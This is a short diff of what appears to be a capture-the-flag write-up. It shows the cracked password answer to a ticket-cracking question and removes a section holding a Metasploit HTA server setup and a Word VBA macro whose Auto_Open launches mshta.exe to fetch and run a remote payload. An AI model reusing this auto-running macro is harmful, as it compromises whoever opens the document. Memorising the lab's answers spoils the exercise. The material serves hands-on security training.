@@ -200,21 +200,3 @@ What password was cracked from the retrieved ticket?
 ```{toggle}
 mysql337570
 ```
-
-
-# Word to your Mother
-
-```msfconsole
-use exploit/windows/misc/hta_server
-set lport 3333
-```
-
-```vb
-Sub MyMacro()
-	PID = Shell("mshta.exe https://IP:8080/c9496fz.hta")
-End Sub
-
-Sub Auto_Open()
-    MyMacro
-End Sub
-```
